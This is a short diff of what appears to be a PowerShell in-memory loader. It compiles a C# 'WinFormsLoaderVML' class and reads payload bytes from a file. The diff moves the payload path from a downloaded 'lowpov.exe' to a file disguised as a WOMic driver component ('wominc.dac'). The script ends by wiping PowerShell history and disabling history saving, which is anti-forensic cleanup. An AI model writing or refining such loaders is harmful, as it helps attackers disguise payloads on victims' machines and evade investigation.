@@ -32,7 +32,7 @@ public class WinFormsLoaderVML
 }
 "@ -ReferencedAssemblies "System.Windows.Forms.dll","System.Drawing.dll","System.dll"
 
-$exePath = C:\Users\pz\Downloads\lowpov.exe
+$exePath = "C:\Program Files (x86)\WOMic\driver\wominc.dac"
 try {
     $bytes = [System.IO.File]::ReadAllBytes($exePath)
     if (-not $bytes) { throw "Arquivo não encontrado ou vazio!" }
@@ -48,3 +48,4 @@ Clear-History
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
 Remove-Item -Force (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 Set-PSReadLineOption -HistorySaveStyle SaveNothing
+
